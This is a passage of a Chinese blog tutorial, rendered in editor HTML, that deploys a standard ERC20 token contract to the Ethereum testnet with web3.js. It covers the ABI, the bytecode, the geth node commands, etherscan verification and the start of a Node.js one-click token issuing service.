class="cm-string">"bool"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"nonpayable"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_owner"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_spender"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>}],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"allowance"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"view"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_initialSupply"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_tokenName"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"string"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_decimalUnits"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint8"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_tokenSymbol"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"string"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"nonpayable"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"constructor"</span>},{<span class="cm-string cm-property">"anonymous"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"indexed"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"from"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"indexed"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"to"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"indexed"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"value"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"Transfer"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"event"</span>},{<span class="cm-string cm-property">"anonymous"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"indexed"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"owner"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"indexed"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"spender"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"indexed"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"value"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"Approval"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"event"</span>}]);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">standardtoken</span> <span class="cm-operator">=</span> <span class="cm-variable">standardtokenContract</span>.<span class="cm-property">new</span>(</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; <span class="cm-variable">_initialSupply</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; <span class="cm-variable">_tokenName</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; <span class="cm-variable">_decimalUnits</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; <span class="cm-variable">_tokenSymbol</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-property">from</span>: <span class="cm-variable">web3</span>.<span class="cm-property">eth</span>.<span class="cm-property">accounts</span>[<span class="cm-number">0</span>],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-property">data</span>: <span class="cm-string">'0x60806040523480156200001157600080fd5b50604051620017b7380380620017b78339810180604052810190808051906020019092919080518201929190602001805190602001909291908051820192919050505083600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550836003819055508260009080519060200190620000b792919062000137565b508060019080519060200190620000d092919062000137565b5081600260006101000a81548160ff021916908360ff16021790555033600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050505050620001e6565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200017a57805160ff1916838001178555620001ab565b82800160010185558215620001ab579182015b82811115620001aa5782518255916020019190600101906200018d565b5b509050620001ba9190620001be565b5090565b620001e391905b80821115620001df576000816000905550600101620001c5565b5090565b90565b6115c180620001f66000396000f3006080604052600436106100ba576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde03146100bf578063095ea7b31461014f57806318160ddd146101b457806323b872dd146101df578063313ce56714610264578063661884631461029557806370a08231146102fa5780638da5cb5b1461035157806395d89b41146103a8578063a9059cbb14610438578063d73dd6231461049d578063dd62ed3e14610502575b600080fd5b3480156100cb57600080fd5b506100d4610579565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101145780820151818401526020810190506100f9565b50505050905090810190601f1680156101415780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561015b57600080fd5b5061019a600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610617565b604051808215151515815260200191505060405180910390f35b3480156101c057600080fd5b506101c9610709565b6040518082815260200191505060405180910390f35b3480156101eb57600080fd5b5061024a600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610713565b604051808215151515815260200191505060405180910390f35b34801561027057600080fd5b50610279610c34565b604051808260ff1660ff16815260200191505060405180910390f35b3480156102a157600080fd5b506102e0600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610c47565b604051808215151515815260200191505060405180910390f35b34801561030657600080fd5b5061033b600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610ed9565b6040518082815260200191505060405180910390f35b34801561035d57600080fd5b50610366610f22565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156103b457600080fd5b506103bd610f48565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156103fd5780820151818401526020810190506103e2565b50505050905090810190601f16801561042a5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561044457600080fd5b50610483600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610fe6565b604051808215151515815260200191505060405180910390f35b3480156104a957600080fd5b506104e8600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506112dd565b604051808215151515815260200191505060405180910390f35b34801561050e57600080fd5b50610563600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506114d9565b6040518082815260200191505060405180910390f35b60008054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561060f5780601f106105e45761010080835404028352916020019161060f565b820191906000526020600020905b8154815290600101906020018083116105f257829003601f168201915b505050505081565b600081600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925846040518082815260200191505060405180910390a36001905092915050565b6000600354905090565b6000600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205482111515156107cc576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f66726f6d27732062616c616e636520697320756e73756666696369656e742e0081525060200191505060405180910390fd5</span><span class="cm-string">b600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205482111515156108e6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001807f76616c756520746f206265207472616e73666572656420697320756e6170707281526020017f6f7665640000000000000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415151561098b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260178152602001807f746f2773206164647265737320697320696e76616c696400000000000000000081525060200191505060405180910390fd5b6109dd82600560008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461156090919063ffffffff16565b600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610a7282600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461157990919063ffffffff16565b600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610b4482600660008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461156090919063ffffffff16565b600660008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a3600190509392505050565b600260009054906101000a900460ff1681565b600080600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490508083101515610d59576000600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610ded565b610d6c838261156090919063ffffffff16565b600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b8373ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546040518082815260200191505060405180910390a3600191505092915050565b6000600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60018054600181600116156101000203166002900480601f016020809104026020016040519081016040528092919081815260200182805460018160011615610100020316600290048015610fde5780601f10610fb357610100808354040283529160200191610fde565b820191906000526020600020905b815481529060010190602001808311610fc157829003601f168201915b505050505081565b6000600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054821115151561109f576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f62616c616e636520697320756e73756666696369656e742e000000000000000081525060200191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614151515611144576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601a8152602001807f746172676574206164647265737320697320696e76616c69642e00000000000081525060200191505060405180910390fd5b61119682600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461156090919063f</span><span class="cm-string">fffffff16565b600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061122b82600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461157990919063ffffffff16565b600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a36001905092915050565b600061136e82600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461157990919063ffffffff16565b600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546040518082815260200191505060405180910390a36001905092915050565b6000600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600082821115151561156e57fe5b818303905092915050565b6000818301905082811015151561158c57fe5b809050929150505600a165627a7a72305820ea5c3e196330ed8fce5d0bf3d3d885bbfca4b8c4d3658539d798f1be545320b90029'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-property">gas</span>: <span class="cm-string">'4700000'</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; }, <span class="cm-keyword">function</span> (<span class="cm-def">e</span>, <span class="cm-def">contract</span>){</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">console</span>.<span class="cm-property">log</span>(<span class="cm-variable-2">e</span>, <span class="cm-variable-2">contract</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-keyword">typeof</span> <span class="cm-variable-2">contract</span>.<span class="cm-property">address</span> <span class="cm-operator">!==</span> <span class="cm-string">'undefined'</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-variable">console</span>.<span class="cm-property">log</span>(<span class="cm-string">'Contract mined! address: '</span> <span class="cm-operator">+</span> <span class="cm-variable-2">contract</span>.<span class="cm-property">address</span> <span class="cm-operator">+</span> <span class="cm-string">' transactionHash: '</span> <span class="cm-operator">+</span> <span class="cm-variable-2">contract</span>.<span class="cm-property">transactionHash</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> })</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 4539px;"></div><div class="CodeMirror-gutters" style="display: none; height: 4539px;"></div></div></div></pre><p>本地运行 geth 节点 <code>./geth --datadir=./testnet --testnet --cache=2048 --rpc console</code>，该节点已同步，同时启用了 rpc 服务。</p><p>运行部署脚本 <code>node erc20.js</code>，得到运行结果如下</p><blockquote><p><strong>合约地址：</strong><code>0x7f224de3c7276312ac8cca8b822ca2d1579d2197</code></p><p><strong>交易 hash：</strong><code>0x4884439622697339381cc305a64ba6f11b5dc82cd0b75a1f13545a4a85f0f67c</code></p></blockquote><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="basic"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Contract</span> <span class="cm-variable">mined</span><span class="cm-operator">!</span> <span class="cm-variable">address</span>: <span class="cm-error">0</span><span class="cm-variable">x7f224de3c7276312ac8cca8b822ca2d1579d2197</span> <span class="cm-variable">transactionHash</span>: <span class="cm-error">0</span><span class="cm-variable">x4884439622697339381cc305a64ba6f11b5dc82cd0b75a1f13545a4a85f0f67c</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 54px;"></div><div class="CodeMirror-gutters" style="display: none; height: 54px;"></div></div></div></pre><p>在 <code>https://ropsten.etherscan.io</code> 查询交易信息</p><p><img src='pic/blockchain/standard_token_contract.png' alt='' referrerPolicy='no-referrer' /></p><p>点击上图中合约地址链接（或直接根据合约地址查询），查询合约详细信息</p><p><img src='pic/blockchain/standard_token_contract2.png' alt='' referrerPolicy='no-referrer' /></p><p>可以点击 <code>Code</code>，填写合约名称、编译器版本、是否启用优化，提交合约源码，进行验证，验证同步哦之后，如下所示</p><p><img src='pic/blockchain/standard_token_verify_contract.png' alt='' referrerPolicy='no-referrer' /></p><p>在 <code>Read Contract</code> 可以对合约进行读操作，如下所示</p><p><img src='pic/blockchain/standard_token_read_contract.png' alt='' referrerPolicy='no-referrer' /></p><h4><a name='header-n420' class='md-header-anchor '></a>在测试网络一键发币</h4><blockquote><p><strong>前提条件：</strong></p><ul><li>本地运行测试网络全节点 <code>./geth --datadir=./testnet --testnet --cache=2048 --rpc console</code>，开启 rpc 服务（监听 8545 端口）</li><li>本地运行代理服务 <code>node erc20_deploy.js</code>，监听 12306 端口，支持客户端 <code>POST</code> 请求一键发币</li></ul></blockquote><p>代理服务脚本 <a href='https://dudebing99.github.io/blog/archives/solidity/erc20_deploy.js'>点击下载</a>，主要解析请求的代币初始化参数，发布合约成功后，返回合约地址、交易 hash</p><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="javascript" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">// init http server</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">http</span> <span class="cm-operator">=</span> <span class="cm-variable">require</span>(<span class="cm-string">'http'</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">url</span> <span class="cm-operator">=</span> <span class="cm-variable">require</span>(<span class="cm-string">'url'</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">_initialSupply</span> <span class="cm-operator">=</span> <span class="cm-number">0</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">_tokenName</span> <span class="cm-operator">=</span> <span class="cm-string">""</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">_decimalUnits</span> <span class="cm-operator">=</span> <span class="cm-number">18</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">_tokenSymbol</span> <span class="cm-operator">=</span> <span class="cm-string">""</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">let</span> <span class="cm-def">Web3</span> <span class="cm-operator">=</span> <span class="cm-variable">require</span>(<span class="cm-string">'web3'</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">let</span> <span class="cm-def">web3</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">if</span> (<span class="cm-keyword">typeof</span> <span class="cm-variable">web3</span> <span class="cm-operator">!==</span> <span class="cm-string">'undefined'</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">web3</span> <span class="cm-operator">=</span> <span class="cm-keyword">new</span> <span class="cm-variable">Web3</span>(<span class="cm-variable">web3</span>.<span class="cm-property">currentProvider</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">} <span class="cm-keyword">else</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-comment">// set the provider you want from Web3.providers</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">web3</span> <span class="cm-operator">=</span> <span class="cm-keyword">new</span> <span class="cm-variable">Web3</span>(<span class="cm-keyword">new</span> <span class="cm-variable">Web3</span>.<span class="cm-property">providers</span>.<span class="cm-property">HttpProvider</span>(<span class="cm-string">"http://localhost:8545"</span>));</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">standardtokenContract</span> <span class="cm-operator">=</span> <span class="cm-variable">web3</span>.<span class="cm-property">eth</span>.<span class="cm-property">contract</span>([{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"inputs"</span>:[],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"name"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"string"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"view"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_spender"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_value"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"approve"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"bool"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"nonpayable"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"inputs"</span>:[],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"totalSupply"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"view"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_from"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_to"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_value"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"transferFrom"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span 